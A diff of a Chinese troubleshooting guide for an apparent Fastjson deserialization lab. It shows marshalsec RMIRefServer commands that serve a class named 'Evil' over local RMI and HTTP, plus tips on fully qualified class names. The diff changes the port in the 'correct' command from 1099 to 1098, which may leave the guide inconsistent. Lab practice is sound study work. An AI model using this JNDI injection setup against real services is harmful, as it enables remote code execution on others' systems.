@@ -127,7 +127,7 @@ java -cp "target/classes;..." com.govuln.fastjsonattack.Client0 rmi://127.0.0.1:
 java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#Evil 1099
 
 # ✅ 正确
-java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#com.govuln.fastjsonattack.Evil 1099
+java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#com.govuln.fastjsonattack.Evil 1098
 ```
 
 ### 错误 2：HTTP 服务器路径不对
@@ -212,5 +212,6 @@ java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#com.
 2. ✅ RMI 服务器 URL 中的类名必须是完整包路径：`com.govuln.fastjsonattack.Evil`
 3. ✅ 使用点号（`.`）而不是斜杠（`/`）分隔包路径
 4. ✅ 验证类文件可以正确访问
+
 
 
